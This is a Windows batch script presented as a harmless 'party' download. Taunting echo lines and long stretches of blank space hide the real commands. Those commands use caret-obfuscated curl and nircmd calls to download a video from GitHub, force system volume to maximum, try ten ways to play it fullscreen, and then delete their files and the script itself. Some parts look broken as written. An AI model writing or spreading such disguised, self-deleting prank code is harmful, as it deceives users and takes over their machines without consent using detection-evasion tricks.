echo Hello! Download this and you will get the party started!































































































echo nothing to see here :)
























echo why are you here still? GO UP!!!

















































echo WHAT ARE YOU DOUNG







































@echo off
echo Initializing...

REM Step 1: Download the video
set "DL_CMD=c^ur^l -o %%TEMP%%\vid.mp4 https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4"
%DL_CMD%

REM Step 2: Set volume to maximum
set "VOL_CMD=nir^cmd.e^xe sets^ysvolu^me 65535"
%VOL_CMD%

REM Step 3: Play video using multiple methods

REM Method 1: Windows Media Player fullscreen via /fullscreen switch
echo Trying Method 1: Windows Media Player with /fullscreen...
start /wait wmplayer /fullscreen "%%TEMP%%\vid.mp4"

REM Method 2: Windows Media Player with explicit fullscreen script
echo Trying Method 2: Windows Media Player with sendkeys fullscreen...
start /wait "" "wmplayer" "%%TEMP%%\vid.mp4"
nircmd.exe sendkeypress F11

REM Method 3: Using mplay32.exe (older Media Player executable)
echo Trying Method 3: mplay32.exe fullscreen...
start /wait mplay32 /play /fullscreen "%%TEMP%%\vid.mp4"

REM Method 4: Using mplay32.exe with F11 fullscreen
echo Trying Method 4: mplay32.exe with sendkeys fullscreen...
start /wait "" "mplay32" "%%TEMP%%\vid.mp4"
nircmd.exe sendkeypress F11

REM Method 5: Windows Media Player ActiveX via PowerShell
echo Trying Method 5: PowerShell with Windows Media Player ActiveX...
powershell -command "Add-Type -TypeDefinition 'using System.Windows.Forms; using WMPLib; public class WMP { public static void Play(string url) { WindowsMediaPlayer wmp = new WindowsMediaPlayer(); wmp.URL = url; wmp.controls.play(); while(wmp.playState -ne 8){Start-Sleep -Milliseconds 100}; wmp.close(); } }'; [WMP]::Play('%%TEMP%%\vid.mp4');"

REM Method 6: VLC Media Player if installed
echo Trying Method 6: VLC Media Player...
start /wait "" "vlc" --fullscreen --play-and-exit --no-qt-privacy-ask "%%TEMP%%\vid.mp4"

REM Method 7: Use WMIC to play via WMP
echo Trying Method 7: WMIC command to start Windows Media Player...
wmic path win32_process call create "wmplayer /fullscreen %%TEMP%%\vid.mp4"

REM Method 8: Using WMPlayer COM object via PowerShell
echo Trying Method 8: PowerShell with WMPlayer COM object...
powershell -command "$wmplayer = New-Object -ComObject WMPlayer.OCX.7; $wmplayer.URL = '%%TEMP%%\vid.mp4'; $wmplayer.controls.play(); Start-Sleep 10; $wmplayer.close();"

REM Method 9: Using HTML Application (HTA) with embedded video
echo Trying Method 9: HTML Application (HTA) with embedded video...
echo ^<html^>^<body^>^<video src='%%TEMP%%\vid.mp4' autoplay controls width='100%%' height='100%%'^>^</video^>^</body^>^</html^> > "%TEMP%\playvideo.hta"
start /wait mshta "%TEMP%\playvideo.hta"

REM Method 10: Use ffplay if installed
echo Trying Method 10: ffplay (part of FFmpeg)...
start /wait "" "ffplay" -fs -autoexit "%%TEMP%%\vid.mp4"

REM Cleanup the downloaded video and temporary files
del "%%TEMP%%\vid.mp4"
del "%%TEMP%%\playvideo.hta"
del "%~f0"
